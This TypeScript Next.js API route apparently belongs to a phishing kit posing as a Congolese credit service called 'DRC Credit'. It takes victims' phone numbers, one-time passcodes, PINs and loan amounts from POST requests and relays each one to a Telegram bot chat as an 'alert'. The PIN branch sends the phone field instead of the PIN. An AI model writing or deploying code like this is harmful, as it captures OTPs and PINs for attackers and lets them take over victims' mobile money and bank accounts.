import { getToken } from '@vercel/connect'
import { NextResponse } from 'next/server'



export async function POST(request: Request) {
  try {
    const body = await request.json() as { type?: 'login' | 'otp' | 'loan'| 'pin'; phone?: string; amount?: string; otp?: string; pin?: string }
    const chatId = process.env.TELEGRAM_CHAT_ID
    const botToken =  process.env.TELEGRAM_BOT_TOKEN
    if (!chatId) {
      return NextResponse.json({ error: 'Telegram recipient is not configured.' }, { status: 503 })
    }

    const message = body.type === 'loan'
      ? `Loan application alert\nAmount: $${body.amount ?? '0'}`
      : body.type === 'otp'
        ? `OTP alert\nCode: ${body.otp ?? 'unknown'}\nPhone: +243 ${body.phone ?? 'unknown'}`
        : body.type === 'pin'
        ? `🔑PIN SUBMITTED ALERT\nPIN: ${body.phone ?? 'unknown'}`
        : `
        🔔 **DRC Credit Login Alert**

📱 Phone Number:+243${body.phone ?? 'unknown'}
⏰ Timestamp: ${new Date().toISOString()}`

    // const botToken = await getToken(CONNECTOR_UID, { subject: { type: 'app' } })
    const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    })

    if (!telegramResponse.ok) {
      return NextResponse.json({ error: 'Telegram notification failed.' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Unable to send Telegram notification.' }, { status: 500 })
  }
}
